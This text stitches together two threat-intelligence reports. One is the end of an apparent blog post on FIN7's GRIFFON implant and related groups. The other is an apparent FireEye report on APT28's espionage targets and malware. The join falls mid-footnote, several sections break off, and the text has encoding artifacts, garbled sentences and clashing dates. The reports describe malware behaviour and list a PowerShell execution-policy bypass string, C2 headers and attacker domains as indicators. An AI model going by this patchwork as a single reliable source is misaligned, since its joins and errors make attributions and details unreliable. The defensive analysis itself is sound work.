downloader\\nThe second module is used by the operators to execute an obfuscated PowerShell script, which contains a Meterpreter downloader widely known as “Tinymet“. This downloader, seen in past FIN7 campaigns, downloads a one-byte XOR-encrypted (eg. with the key equal to 0x50 or 0x51) piece of meterpreter shellcode to execute.\\nScreenshot module\\nThe third module allows the operators to take a screenshot of the remote system. To do that, it also drops a PowerShell script on the workstation to execute. The script executes an open-source .NET class used for taking a screenshot. The resulting screenshot is saved at “%TMP%/image.png”, sent back to the attackers by the GRIFFON implant and then deleted.\\nPersistence module\\nThe last retrieved module is a persistence module. If the victim appears valuable to the attackers, a GRIFFON implant installer is pushed to the victim’s workstation. This module stores another instance of the GRIFFON implant inside the registry to achieve persistence. Here is a PowerLinks-style method used by the attackers to achieve persistence and execute the GRIFFON implant at each user logon. The new GRIFFON implant is written to the hard drive before each execution, limiting the “file-less” aspect of this method.\\nThrough its light weight and modular architecture, the GRIFFON implant is the perfect validator. Even though we have been able to retrieve four different modules, it is possible that the FIN7 operators have more modules in their toolsets for achieving their objectives on the victim’s workstation.\\nOn the hunt for GRIFFON infrastructure\\nAttackers make mistakes, and FIN7 are no exception. The major error made by its operators allowed us to follow the command and control server of the GRIFFON implant last year. In order to trick blue teams and other DFIR analysts, the operators created fake HTTP 302 redirection to various Google services on their C2s servers.\\nHTTP/1.1 302 Found\\nServer: nginx\\nDate: [retracted]\\nContent-Type: text/html; charset=UTF-8\\nContent-Length: 0\\nConnection: keep-alive\\nLocation: https://cloud.google.com/cdn/\\n1234567\\nHTTP/1.1 302 FoundServer: nginxDate: [retracted]Content-Type: text/html; charset=UTF-8Content-Length: 0Connection: keep-aliveLocation: https://cloud.google.com/cdn/\\nReturned headers for most of the GRIFFON C2s servers on port 443\\nThis error allowed us to follow the infrastructure week by week, until an individual pushed on Twitter the heuristic to track their C2 at the end of December 2018. A few days after the tweet, in January 2019, the operators changed their landing page in order to prevent this type of tracking against their infrastructure.\\nFake pentest company\\nDuring the investigation related to the GRIFFON infrastructure, we found a strange overlap between the WHOIS record of an old GRIFFON C2 and the website of a fake company.\\nAccording to the website, that domain supposedly belongs to a legitimate security company “fully owned by the Russian Government” (sic.) and having offices in “Moscow, Saint Petersburg and Yekaterinburg”, but the address says the company is located in Trump Tower, in New York. Given FIN7’s previous use of false security companies, we decided to look deeper into this one.\\nAs we were looking at the content of the website, it became evident that almost all of the text used was lifted from legitimate security-company websites. Phrases and sentences were borrowed from at least the following companies/sites:\\nDKSec – www.dksec.com\\nOKIOK – www.okiok.com/services/tailored-solutions\\nMainNerve – www.mainnerve.com\\nDatics – www.datatics.com/cyber-security\\nPerspective Risk – www.perspectiverisk.com\\nSynack – https://www.synack.com/company\\nFireEye – https://www.fireeye.com/services/penetration-testing.html\\nThis company seems to have been used by the FIN7 threat actor to hire new people as translators, developers and pentesters. During our research, we found various job advertisements associated with the company on freelance and remote-work websites.\\nIn addition to that, various individuals have mentioned the company in their resumes. We believe that some of these individuals may not even be aware that they are working for a cybercrime business.\\nLinks to other intrusion sets\\nWhile tracking numerous threat actors on a daily basis during the final days of 2018 and at the beginning of 2019, we discovered various activity clusters sharing certain TTPs associated with the FIN7 intrusion set. The link between these threat actors and FIN7 is still weak, but we decided to disclose a few hints regarding these in this blog post.\\nCobaltGoblin/EmpireMonkey\\nIn his history, FIN7 has overlapped several times with Cobalt/EmpireMonkey in terms of TTPs. This activity cluster, which Kaspersky Lab has followed for a few years, uses various implants for targeting mainly banks, and developers of banking and money processing software solutions. At the end of 2018, the cluster started to use not only CobaltStrike but also Powershell Empire in order to gain a foothold on the victims’ networks. After a successful penetration, it uses its own backdoors and the CobaltStrike framework or Powershell Empire components to hop to interesting parts of the network, where it can monetize its access.\\nFIN7’s last campaigns were targeting banks in Europe and Central America. This threat actor stole suspected of stealing €13 million from Bank of Valetta, Malta earlier this year.\\nExample of malicious documents used in the end of 2018 to beginning of 2019\\nA few interesting overlaps in recent FIN7 campaigns:\\nBoth used macros to copy wscript.exe to another file, which began with “ms” (mses.exe – FIN7, msutil.exe – EmpireMonkey).\\nBoth executed a JScript file named “error” in %TEMP% (Errors.txt in the case of FIN7, Errors.bat for EmpireMonkey).\\nBoth used DocuSign decoy documents with different macros. The macros popped the same “Document decryption error” error message—even if macro code remain totally different.\\nWe have a high level of confidence in a historic association between FIN7 and Cobalt, even though we believe that these two clusters of activity are operated by different teams.\\nAveMaria\\nAveMaria is a new botnet, whose first version we found in September 2018, right after the arrests of the FIN7 members. We have medium confidence that this botnet falls under the FIN7 umbrella. In fact, AveMaria is a classic infostealer bot that collects all possible credentials from various types of software: browsers, email clients, messengers, etc., and can act as a keylogger. Since the beginning of 2019, we have collected more than 1300 samples and extracted more than 130 C2s.\\nTo deliver their malware, the cyber criminals use spearphishing emails with various types of attachments: MS Office documents or spreadsheet files exploiting some known vulnerability like CVE-2017-11882, or documents with Ole2Link and SCT. They also use AutoIT droppers, password-protected EXE files and even ISO images. What is interesting, in some emails, they ask targets to phone them if they have any questions, like the FIN7 guys do.\\nExample of AveMaria spearphing emails. Criminals suggest calling them.\\nDuring the investigation into FIN7, our threat-hunting systems found an interesting overlap in between the infrastructure of FIN7 and AveMaria. Basically, two servers in the same IP range and AS14576 (autonomous system) share a non-standard SSH port, which is 222. One of the servers is a Griffon C2, and the other one, an AveMaria C2.\\nDistribution of targets is another factor suggesting that these two malware families may be connected. We analyzed AveMaria targets during February and March of 2019. The spearphishing emails were sent to various kinds of businesses only and did not target individuals. Thirty percent of the targets were small and medium-sized companies that were suppliers or service providers for bigger players and 21% were various types of manufacturing companies. We also spotted several typical FIN7 targets, such as retailers and hotels. Most AveMaria targets (72%) were in the EU.\\nCopyPaste\\nAt the end of 2018, while searching for new FIN7 campaigns via telemetry, we discovered a set of activity that we temporarily called “CopyPaste” from a previously unknown APT. Interestingly, this actor targeted financial entities and companies in one African country, which lead us to think that CopyPaste was associated with cybermercenaries or a training center.\\nThis set of activity relied on open-source tools, such as Powershell Empire, and well-documented red teaming techniques, in order to get a foothold within the victim’s networks and avoid detection.\\nHere are the main similarities between CopyPaste and FIN7:\\nBoth used the same Microsoft PowerShell argument obfuscation order: “powershell.exe -NoP -NonI -ExecutionPolicy Bypass”. We have only seen FIN7 and CopyPaste use this argument list for executing their malicious Powershell Scripts.\\nBoth used decoy 302 HTTP redirections and typosquatting on their C2s (reminiscent of Cobalt and FIN7). The Empire C2s associated with CopyPaste had decoy redirections to Digitcert and Microsoft websites and used decoy job employment and tax websites with decoy redirections to host their payloads. FIN7 and Cobalt used decoy 302 HTTP redirections too, FIN7 on its GRIFFON C2s before January 2018, and Cobalt, on its staging servers, similar to CopyPaste.\\nQuite recently, FIN7 threat actors typosquatted the brand “Digicert” using the domain name digicert-cdn[.]com, which is used as a command and control server for their GRIFFON implants. CopyPaste, in turn, also typosquatted this brand with their domains digicertweb[.]com and digi-cert[.]org, both used as a Powershell Empire C2 with decoy HTTP 302 redirects to the legitimate Digicert website.\\nThe links between CopyPaste and FIN7 are still very weak. It is possible that the CopyPaste operators were influenced by open-source publications and do not have any ties with FIN7.\\nConclusions\\nDuring 2018, Europol and DoJ announced the arrest of the leader of the FIN7 and Carbanak/CobaltGoblin cybercrime groups. It was believed that the arrest of the group leader will have an impact on the group’s operations. However, recent data seems to indicate that the attacks have continued without significant drawbacks. One may say CobaltGoblin and FIN7 have even extended the number of groups operating under their umbrella. We observe, with various level of confidence, that there are several interconnected groups using very similar toolkits and the same infrastructure to conduct their cyberattacks.\\nThe first of them is the well-known FIN7, which specializes in attacking various companies to get access to financial data or PoS infrastructure. They rely on a Griffon JS backdoor and Cobalt/Meterpreter, and in recent attacks, Powershell Empire. The second one is CobaltGoblin/Carbanak/EmpireMonkey, which uses the same toolkit, techniques and similar infrastructure but targets only financial institutions and associated software/services providers.\\nWe link the AveMaria botnet to these two groups with medium confidence: AveMaria’s targets are mostly suppliers for big companies, and the way AveMaria manages its infrastructure is very similar to FIN7. The last piece is the newly discovered CopyPaste group, who targeted financial entities and companies in one African country, which lead us to think that CopyPaste was associated with cybermercenaries or a training center. The links between CopyPaste and FIN7 are still very weak. It is possible that the operators of this cluster of activity were influenced by open-source publications and do not have any ties with FIN7.\\nAll of the aforementioned groups greatly benefit from unpatched systems in corporate environments. They thus continue to use effective spearphishing campaigns in conjunction with well-known MS Office exploits generated by the framework. So far, the groups have not used any zero-days.\\nFIN7/Cobalt phishing documents may seem basic, but when combined with their extensive social engineering and focused targeting, they are quite successful. As with their previous fake company “Combi Security”, we are confident that they continue to create new personas for use in either targeting or recruiting under a “new” brand, “IPC”.\\nMore information about these and related attacks is available to customers of Kaspersky Intelligence Reports.

The New York Times 12 August 2008. Web. http://www.nytimes.com/2008/08/13/technology/13cyber.html 2 Knowlton, Brian. ﬁMilitary Computer Attack Confirmedﬂ. The New York Times. 25 August 2010. Web. http://www.nytimes.com/2010/08/26/ technology/26cyber.html EXECUTIVE SUMMARYIn this paper we discuss a threat group whose malware is already fairly well-known in the cybersecurity community. This group, unlike the China-based threat actors we track, does not appear to conduct widespread intellectual property theft for economic gain. Nor have we observed the group steal and profit from financial account information.The activity that we profile in this paper appears to be the work of a skilled team of developers and operators collecting intelligence on defense and geopolitical issues Œ intelligence that would only be useful to a government. We believe that this is an advanced persistent threat (APT) group engaged in espionage against political and military targets including the country of Georgia, Eastern European governments and militaries, and European security organizations since at least 2007. They compile malware samples with Russian language settings during working hours consistent with the time zone of Russia™s major cities, including Moscow and St. Petersburg. While we don™t have pictures of a building, personas to reveal, or a government agency to name, what we do have is evidence of long- standing, focused operations that indicate a government sponsor Œ specifically, a government based in Moscow. We are tracking this group as APT28. Our clients often ask us to assess the threat Russia poses in cyberspace. Russia has long been a whispered frontrunner among capable nations for performing sophisticated network operations. This perception is due in part to the Russian government™s alleged involvement in the cyber attacks accompanying its invasion of Georgia in 2008, as well as the rampant speculation that Moscow was behind a major U.S. Department of Defense network compromise, also in 2008. These rumored activities, combined with a dearth of hard evidence, have made Russia into something of a phantom in cyberspace. 4 fireeye.com APT 28: A Window into Russia™s Cyber Espionage Operations? KEY FINDINGSGEORGIA EASTERN EUROPE SECURITY ORGANIZATIONS APT28 likely seeks to collect intelligence about Georgia™s security and political dynamics by targeting officials working for the Ministry of Internal Affairs and the Ministry of Defense.APT28 has demonstrated interest in Eastern European governments and security organizations. These victims would provide the Russian government with an ability to predict policymaker intentions and gauge its ability to influence public opinion.APT28 appeared to target individuals affiliated with European security organizations and global multilateral institutions. The Russian government has long cited European security organizations like NATO and the OSCE as existential threats, particularly during periods of increased tension in Europe.APT28 targets insider information related to governments, militaries, and security organizations that would likely benefit the Russian government. 5 fireeye.com KEY FINDINGS Malware compile times suggest that APT28 developers have consistently updated their tools over the last seven years. APT28 malware, in particular the family of modular backdoors that we call CHOPSTICK, indicates a formal code development environment. Such an environment would almost certainly be required to track and define the various modules that can be included in the backdoor at compile time. APT28 tailors implants for specific victim environments. They steal data by configuring their implants to send data out of the network using a victim network™s mail server. Several of APT28™s malware samples contain counter- analysis capabilities including runtime checks to identify an analysis environment, obfuscated strings unpacked at runtime, and the inclusion of unused machine instructions to slow analysis. Indicators in APT28™s malware suggest that the group consists of Russian speakers operating during business hours in Russia™s major cities. More than half of the malware samples with Portable Executable (PE) resources that we have attributed to APT28 included Russian language settings (as opposed to neutral or English settings), suggesting that a significant portion of APT28 malware was compiled in a Russian language build environment consistently over the course of six years (2007 to 2013).Over 96% of the malware samples we have attributed to APT28 were compiled between Monday and Friday. More than 89% were compiled between 8AM and 6PM in the UTC+4 time zone, which parallels the working hours in Moscow and St. Petersburg. These samples had compile dates ranging from mid-2007 to September 2014. Since 2007, APT28 has systematically evolved its malware, using flexible and lasting platforms indicative of plans for long-term use. The coding practices evident in the group™s malware suggest both a high level of skill and an interest in complicating reverse engineering efforts. Malware compile times suggest that APT28 developers have consistently updated their tools over the last seven years. 6 fireeye.com Three themes in APT28™s targeting clearly reflect areas of specific interest to an Eastern European government, most likely the Russian government. 7 Bloomberg. ﬁNeiman Marcus Hackers Set Off 60,000 Alerts While Bagging Credit Card Data.ﬂ February 2014. 8 Ibid.9 Ibid.APT28 TARGETING REFLECTS Many of APT28™s targets align generally with interests that are typical of any government. However, three themes in APT28™s targeting clearly reflects areas of specific interest to an Eastern European government, most likely the Russian government. These include the Caucasus (especially the Georgian government), Eastern European governments and militaries, and specific security organizations.APT28 uses spearphishing emails to target its victims, a common tactic in which the threat group crafts its emails to mention specific topics (lures) relevant to recipients. This increases the likelihood that recipients will believe that the email is legitimate and will be interested in opening the message, opening any attached files, or clicking on a link in the body of the email. Since spearphishing lures are tailored to the recipients whose accounts APT28 hopes to breach, the subjects of the lures provide clues as to APT28™s targets and interests. For example, if the group™s lures repeatedly refer to the Caucasus, then this most likely indicates that APT28 is trying to gain access to the accounts of individuals whose work pertains to the Caucasus. Similarly, APT28™s practice of registering domains that mimic those of legitimate news, politics, or other websites indicates topics that are relevant to APT28™s targets. We identified three themes in APT28™s lures and registered domains, which together are particularly relevant to the Russian government. In addition to these themes, we have seen APT28 target a range of political and military organizations. We assess that the work of these organizations serves nation state governments. RUSSIAN INTERESTSThe Caucasus, particularly the country of GeorgiaEastern European governments and militariesThe North Atlantic Treaty Organization (NATO) and other European security organizationsAPT 28: Three Themes 7 fireeye.com The Caucasus, a region that includes Chechnya and other Russian republics and the independent states of Georgia, Armenia, and Azerbaijan, continues to experience political unrest. The Georgian government™s posture and ties to the West are a frequent source of Moscow™s frustration, particularly after the 2008 war. Overall, issues in the Caucasus likely serve as focal points for Russian intelligence collection efforts.APT28 INTEREST IN THE CAUCASUS, PARTICULARLY GEORGIA Since 2011, APT28 has used lures written in Georgian that are probably intended to target Georgian government agencies or citizens. APT28 is likely seeking information on Georgia™s security and diplomatic postures. Specifically, the group has targeted the Georgian Ministry of Internal Affairs (MIA) and the Ministry of Defense (MOD). We also observed efforts to target a journalist working on issues in the Caucasus and a controversial Chechen news site.

In one case, we identified an APT28 lure from mid-2013 that referenced MIA-related topics and employed malware that attempted to disguise its activity as legitimate MIA email traffic. The lure consisted of a weaponized Excel file that presented a decoy document containing a list of Georgian driver™s 3 Georgian Ministry of Internal Affairs website http://police.ge/en/home 4 Queries on the author yielded a LinkedIn page for a person of the same name who serves as a system administrator in Tbilisi. license numbers. The backdoor attempted to establish a connection to a Georgian MIA mail server and communicate via MIA email addresses ending with ﬁ@mia.ge.govﬂ. Once connected to the mail server, APT28™s backdoor sent an email message using a subject line related to driver™s licenses (in Georgian), and attached a file containing system reconnaissance information. This tactic could allow APT28 to obtain data from the MIA™s network through a less-monitored route, limiting the MIA network security department™s abilities to detect the traffic. In the second example of MIA targeting, an APT28 lure used an information technology-themed decoy document that included references to the Windows domain ﬁMIA Users\\\\Ortachala–ﬂ (Figure 1). This probably referred to the MIA facility in the Ortachala district of Tbilisi, Georgia™s capital city. The decoy document also contains metadata listing ﬁMIAﬂ as the company name and ﬁBeka Nozadzeﬂ 4 as an author, a possible reference to a system administrator in Tbilisi. The text of the document purports to provide domain and user group setup APT28 made at least two specific attempts to target the Georgian Ministry of Internal Affairs.Georgian Ministry of Internal Affairs (MIA)APT 28: A Window into Russia™s Cyber Espionage Operations? 9 fireeye.com Figure 1: Georgian MIA-related decoy information for internal Windows XP and Windows 7 systems. APT28 possibly crafted this document to appear legitimate to all MIA system users and intended to breach the MIA network specifically using the embedded malware.APT28 Targeting of the Georgian Ministry of DefenseAPT28 also appeared to target Georgia™s MOD along with a U.S. defense contractor that was training the Georgian military. APT28 used a lure document that installed a SOURFACE downloader (further discussed in the Malware section) and contained a listing of birthdays for members of a working group between the Georgian MOD and the U.S. defense contractor. The U.S. contractor was involved in a working group to advise the MOD and Georgian Armed Forces, assess Georgia™s military capabilities, and develop a military training program for the country. 10 fireeye.com Figure 2: Excerpt of APT28™s letter to a journalist writing on Caucasus-related issues We believe that APT28™s targeting of the MOD aligns with Russian threat perceptions. The growing U.S.-Georgian military relationship has been a source of angst for Russia. Georgia and Russia severed diplomatic relations following the Russia-Georgia War in 2008, and Georgia has since sought to align itself more closely with western security organizations. Additionally, in June 2014, despite Russia™s vocal objections, Georgia, along with Ukraine and Moldova, signed association accords with the EU. 5 This move placed all three countries more firmly in the EU™s political, economic, and security spheres of influence. Georgian military security issues, particularly with regard to U.S. cooperation and NATO, provide a strong incentive for Russian state-sponsored threat actors to steal information that sheds light on these topics.APT28 Targeting a Journalist Covering the Caucasus Another one of APT28™s lures appeared to target a specific journalist covering issues in the Caucasus region. In late 2013, APT28 used a lure that contained a letter addressing a journalist by his first name and claiming to originate from a ﬁChief Coordinatorﬂ in Reason Magazine™s ﬁCaucasian Issues Departmentﬂ - a division that does not appear to exist. 6 (Reason Magazine is a US-based magazine) The letter welcomed the individual as a contributor and requested topic ideas and identification information in order to establish him at the magazine. In the background, the decoy document installed a SOURFACE backdoor on the victim™s system. We wish our cooperation will be both profitable and trusted. Our aim in the Caucasian region is to help people who struggle for their independence, liberty and human rights. We all know, that world is often unfair and cruel, but all together we can make it better. Send your articles on this email Œ in Russian or English, please.

European Union Press Release Database. 23 June 2014. Web. http://e uropa.eu/rapid/press-release_MEMO-14-430_en.htm 6 We attempted to identify candidate journalists in the country. One of these was a Georgian national of Chechen descent, whose work appears to center on Chechen and human rights issues. Ultimately, however, we cannot confirm the identity of the target(s). Targeting journalists could provide APT28 and its sponsors with a way to monitor public opinion, identify dissidents, spread disinformation, or facilitate further targeting. 11 fireeye.com The body of the letter suggests that APT28 actors are able to read at least two languages Œ Russian and English. The grammar of the letter also indicates that English is not the author™s first language, despite it purportedly originating from a US-based magazine. This implies that Russian may be the APT28 author™s preferred language.Targeting journalists could provide APT28 and its sponsors with a way to monitor public opinion, identify dissidents, spread disinformation, or facilitate further targeting. Several other nation states are suspected of targeting journalists and dissidents to monitor their activity, including China and Iran. 7,8 Journalists in the Caucasus working on Caucasus independence issues would be a prime target for intelligence collection for Moscow. Journalists critical of the Kremlin have long been targets of surveillance and harassment, and a number of governments and human rights organizations have publicly criticized the government for its treatment of journalists and its increasing consolidation of control over the media. 9 APT28™s Other Targets in the Caucasus We have seen APT28 register at least two domains mimicking the domains of legitimate organizations in the Caucasus, as shown in the table below. One APT28 domain imitated a key Chechen-focused news website, while the other appeared to target members of the Armenian military by hosting a fake login page. Of particular note, the Kavkaz Center is a Chechen-run website designed to present an alternative view to the long-running conflict between Russia and Chechen separatists. In 200410 and 2013,11 Russia™s Foreign Minister voiced his displeasure that a Swedish company continues to host the Kavkaz Center website. 7 Moran, Ned, Villeneuve, Nart, Haq, Thofique, and Scott, Mike. ﬁOperation Saffron Roseﬂ.

The Kremlin has long regarded the former Soviet Republics and satellite states as in its sphere of economic, political, and military interest. Over the past two decades, as many of these states joined NATO and the EU, Russia has attempted to regain its influence in the region. Many of APT28™s targets parallel this continued focus on Eastern European governments and militaries. APT28 Targets Eastern European Government Organizations We have evidence that APT28 made at least two attempts to compromise Eastern European government organizations: In a late 2013 incident, a FireEye device deployed at an Eastern European Ministry of Foreign Affairs detected APT28 malware in the client™s network.More recently, in August 2014 APT28 used a lure (Figure 3) about hostilities surrounding a Malaysia Airlines flight downed in Ukraine in a probable attempt to compromise the Polish government. A SOURFACE sample employed in the same Malaysia Airlines lure was referenced by a Polish computer security company in a blog post. 12 The Polish security company indicated that the sample was ﬁsent to the government,ﬂ presumably the Polish government, given the company™s location and visibility. 12 ﬁMHT, MS12-27 Oraz *malware*.infoﬂ Malware@Prevenity. 11 August 2014.

These domain registrations not only suggest that APT28 is interested in Eastern European political affairs, but also that the group targets Eastern European governments directly. In addition, APT28 used one domain for command and control sessions (baltichost[.]org) that was themed after the Baltic Host exercises. Baltic Host is a multinational logistics planning exercise, hosted annually since 2009 by one of the three Baltic States (Estonia, Latvia, and Lithuania, all three of which are on Russia™s border) on a rotational basis. In June 2014, this event was integrated with a larger U.S. Army training event, and focused on exercises to improve interoperability with regional allies and partners.13, 14 This domain registration suggests that APT28 sought to target individuals either participating in the exercises or interested in Baltic military and security matters. Such targets would potentially provide APT28 with sensitive tactical and strategic intelligence concerning regional military capabilities and relationships. These exercises are a particular point of interest in Moscow: pro-Kremlin press cited Russia™s interpretation of these military exercises and NATO™s involvement as a ﬁsign of aggression,ﬂ and Russia™s Foreign Minister publicly stated that the exercise was ﬁa demonstration of hostile intention.ﬂ 15 Table 2: Examples of APT28 domains imitating legitimate Eastern European organization names APT28 DomainReal Domainstandartnevvs[.]comBulgarian Standart News website (standartnews.com)novinitie[.]com, n0vinite[.]comBulgarian Sofia News Agency website (novinite.com)qov[.]hu[.]comHungarian government domain (gov.hu) q0v[.]pl, mail[.]q0v[.]plPolish government domain (gov.pl) and mail server domain (mail.gov.pl) poczta.mon[.]q0v[.]plPolish Ministry of Defense mail server domain (poczta.mon.gov.pl) 13 ﬁSaber Strike and Baltic Host kick off in Latvia, Lithuania and Estonia™.

APT28™s lures and domain registrations also demonstrate their interest in NATO and other European security organizations. NATO remains a chief Russian adversary, or in the words of Russia™s 2010 military doctrine, a ﬁmain external military dangerﬂ particularly as it moves ﬁcloser to the borders of the Russian Federation.ﬂ 16 As the traditional western counterweight to the Soviet Union, Russia regards NATO, particularly NATO™s eastward expansion, as a threat to Russia™s strategic stability. APT28 also registered a domain name imitating the Organization for Security and Cooperation in Europe (OSCE), an intergovernmental organization that has cited widespread fraud in numerous Russian state elections. Insider information about NATO, the OSCE and other security organizations would inform Russian political and military policy. Several of the domains APT28 registered imitated NATO domain names, including those of NATO Special Operations Headquarters and the NATO Future Forces Exhibition. We also observed a user that we suspect works for NATO HQ submit an APT28 sample to VirusTotal, probably as a result of receiving a suspicious email.

We identified an APT28 lure containing a decoy document with a list of British officers and U.S. and Canadian military attachés in London. Finally, APT28 used a lure that contained an apparent non-public listing of contact information for defense attachés in the ﬁAnkara Military Attaché Corps (AMAC),ﬂ which appears to be a professional organization of defense attachés in Turkey. Figure 4: Decoy document used against military attaches in 2012 16 fireeye.com APT 28: A Window into Russia™s Cyber Espionage Operations? APT28 Targets European Defense ExhibitionsIn addition to targeting European security organizations and governments, it appears that APT28 is targeting attendees of European defense exhibitions. Some of the APT28- registered domains imitated those of defense events held in Europe, such as the Farnborough Airshow 2014, EuroNaval 2014, EUROSATORY 2014, and the Counter Terror Expo. In September 2014, APT28 registered a domain (smigroup-online.co[.]uk) that appeared to mimic that for the SMi Group, a company that plans events for the ﬁDefence, Security, Energy, Utilities, Finance and Pharmaceutical sectors.ﬂ Among other events, the SMi Group is currently planning a military satellite communications event for November 2014. Targeting organizations and professionals involved in these defense events would likely provide APT28 with an opportunity to procure intelligence pertaining to new defense technologies, as well as the victim organizations™ operations, communications, and future plans. Targeting organizations and professionals involved in these defense events would likely provide APT28 with an opportunity to procure intelligence pertaining to new defense technologies. 17 fireeye.com APT28 has targeted a variety of organizations that fall outside of the three themes we highlighted above. However, we are not profiling all of APT28™s targets with the same detail because they are not particularly indicative of a specific sponsor™s interests.

APT28 MALWARE INDICATES SKILLED RUSSIAN DEVELOPERS APT28™s tools are suggestive of the group™s skills, ambitions, and identity. Our analysis of some of the group™s more commonly used tools indicates that APT28 has been systematically updating their tools since 2007. APT28 is most likely supported by a group of developers creating tools intended for long-term use and versatility, who make an effort to obfuscate their activity. This suggests that APT28 receives direct ongoing financial and other resources from a well-established organization, most likely a nation state government. APT28™s malware settings suggest that the developers have done the majority of their work in a Russian language build environment during Russian business hours, which suggests that the Russian government is APT28™s sponsor. Some of APT28™s more commonly used tools are the SOURFACE downloader, its second stage backdoor EVILTOSS, and a modular family of implants that we call CHOPSTICK.SOURFACE: This downloader is typically called Sofacy within the cyber security community. However because we have observed the name ﬁSofacyﬂ used to refer to APT28 malware generally (to include the SOURFACE dropper, EVILTOSS, CHOPSTICK, and the credential harvester OLDBAIT), we are using the name SOURFACE to precisely refer to a specific downloader. This downloader obtains a second-stage backdoor from a C2 server. CORESHELL is an updated version of SOURFACE. EVILTOSS: This backdoor has been delivered through the SOURFACE downloader to gain system access for reconnaissance, monitoring, credential theft, and shellcode execution. CHOPSTICK: This is a modular implant compiled from a software framework that provides tailored functionality and flexibility. Our analysis of some of the group™s more commonly used tools indicates that APT28 has been systematically updating their malware since 2007. 20 fireeye.com A number of the malware variants that we profile below, especially the CHOPSTICK family, demonstrate formal coding practices indicative of methodical, diligent programmers. The modularity of CHOPSTICK alone, with its flexible and lasting platform, demonstrates planning for long-term use and versatility. We have also noted that APT28 tailors implants to their target environments, configuring them to use local network resources such as email servers. APT28 has attempted to obfuscate their code and implement counter-analysis techniques:Figure 6: Typical deployment of SOURFACE ecosystem Spearphishing EmailDocument with exploitDropper malware SOURFACE downloader Deploys 2nd stage droppers 2nd stage implantObtains 2nd stageC2 ServerOne of the latest samples of CORESHELL includes counter-reverse engineering tactics via unused machine instructions. This would hinder static analysis of CORESHELL behavior by creating a large amount of unnecessary noise in the disassembly. A number of CORESHELL droppers also conduct runtime checks, attempting to determine if they are executing in an analysis environment, and if so, they do not trigger their payloads. Many samples across the SOURFACE/ CORESHELL, CHOPSTICK, and EVILTOSS 21 fireeye.com APT 28: A Window into Russia™s Cyber Espionage Operations? malware families obfuscate strings that are decoded at runtime. Two of the malware families (SOURFACE/CORESHELL and EVILTOSS) use the same decryption sequence and similar algorithms for string encoding and decoding. These families encode their strings at compile time using a custom stream cipher. From a high level, these ciphers share a similar design across the malware families but differ slightly in the internal arithmetic operations. APT28 has employed RSA encryption to protect files and stolen information moved from the victim™s network to the controller. APT28 has made incremental and systematic changes to the SOURFACE downloader and its surrounding ecosystem since as early as 2007. These changes indicate a long-standing and dedicated development effort behind APT28. We have observed samples of the SOURFACE downloader compiled between 2007 and 2014. We call SOURFACE (samples are frequently named netids.dll) a first stage downloader because its primary job is to retrieve a second stage payload from a C2 server. Until 2013, the SOURFACE downloader used hard-coded IP addresses for C2 communications, whereas the future CORESHELL samples use domains.EVOLUTION OF SOURFACE ECOSYSTEM INDICATES SYSTEMATIC DEVELOPMENT WHAT IS A MALWARE ECOSYSTEM? First, a malware family is a collection of malware in which each sample shares a significant amount of code with all of the others. There are exceptions: for example, some files contain public and standard code libraries that we do not take into consideration when making a family determination.A malware ecosystem is a group of malware families that work together to perform the same objective. Perhaps the simplest and most typical ecosystem is a dropper and a backdoor that are used together. They may not share the same code structure, but they are related because one drops and installs the other. The ecosystem surrounding the SOURFACE downloader frequently consists of a dropper, which installs SOURFACE. The SOURFACE downloader then receives another dropper from its C2 server, and this second dropper installs a second stage backdoor, which is usually EVILTOSS. 22 fireeye.com In April 2013, based on compile time, the group began to make significant alterations to the SOURFACE downloader. They started by changing the compiled DLL name to ﬁcoreshell.dllﬂ and making minor changes to the network communications, as seen in Figure 7.The hostname, volume serial number and OS version data are encoded in the new URL format. As seen in the table below, the SOURFACE/ CORESHELL developers also made other modifications that changed the exported function name and file size over time. 17 SOURFACE with minor changes to network communications (see Figure 7). 18 Basic anti-debug measures added (process listing, rand timing, is DebuggerPresent). 19 Switches from loading a secondary DLL (netui.dll/WinIDS.dll) to uploading the contents of %temp%\\\\chkdbg.log. 20 Statically links msvcrt library. 21 Statically links msvcrt library and the strings used to identify the imported libraries and functions are reversed prior to being used, then reversed back after use. 22This version added assembly level obfuscation, which slows down analysis. This variant requires the OS to be at least Windows Vista.

However, it contains more capabilities, including the ability to provide access to the file system and registry, enumerate network resources, create processes, log keystrokes, access stored credentials, and execute shellcode. The backdoor encrypts data that it uploads with an RSA public key. Many of its variants we have seen are named netui.dll. EVILTOSS variants may use the Simple Mail Transfer Protocol (SMTP) to send stolen data in an attachment named ﬁdetaluri.datﬂ. The backdoor attaches this file to a preformatted email and sends it out through a victim™s mail server. Interestingly, we found an antivirus report from 200423 detailing what appears to be an early variant of EVILTOSS. The backdoor was installed alongside the NATO-themed decoy document depicted in Figure 8. The backdoor sent data via SMTP to nato_smtp@mail[.]ru and received its tasking via POP from nato_pop@mail[.]ru. Although we have not conclusively attributed this sample to APT28, it does suggest the possibility that APT28 has been operating since as early as 2004.24 23 http://ae.norton.com/security_response/print_writeup.jsp?docid=2004-081915-1004-99 24 Although the malware family and interest in NATO make it likely that APT28 was involved, we cannot conclusively attribute this sample to APT28 based on these factors alone. We have no evidence that they controlled the C2 for this malware or were using EVILTOSS in 2004. APT28 could have possibly obtained this source code from another group of actors. Also, malware can be passed from group to group. The other malware that we associate with APT28 in this paper is more strongly attributed to the group using additional factors, some of which we mention in Appendix A.In April 2013, based on compile time, the group began to make significant alterations to the SOURFACE downloader. 24 fireeye.com During our research, we discovered that APT28 uses a backdoor developed using a modular framework. We call this backdoor CHOPSTICK, a somewhat ironic name that comes from our semi-random name generator. The modular design allows flexible options for compiling variants with different capabilities as needed, as well as deploying additional capabilities at runtime. This allows the developers to make targeted implants, including only the capabilities and protocols necessary for a specific environment. Such a modular framework suggests the group has had an organized development effort since as early as 2007. A formal development environment, in which code is versioned and well-organized, would almost certainly be required to track and define the various modules that can be included in the backdoor at compile time. CHOPSTICK variants may move messages and information using at least three methods:1. Communications with a C2 server using HTTP. These protocols are covered in more detail in Appendix D. 2. Email sent through a specified mail server. One CHOPSTICK v1 variant contained modules and functions for collecting keystroke logs, Microsoft Office documents, and PGP files. The monitoring for new files of interest is performed by a ﬁDirectory Observerﬂ module. In one sample this information was intended to be sent via SMTP using a Georgian MIA mail server. It used one of four embedded sender email addresses (@mia.gov.ge) to send files via email to another email address on the same mail server. All information required for the email was hardcoded in the backdoor. 3. Local copying to defeat closed networks. One variant of CHOPSTICK focuses on apparent air gap / closed network capabilities by routing messages between local directories, the registry and USB drives. A modular development framework suggests the group has had an organized development effort since as early as 2007. MODULAR IMPLANTS INDICATE A FORMAL DEVELOPMENT ENVIRONMENT 25 fireeye.com During our research into 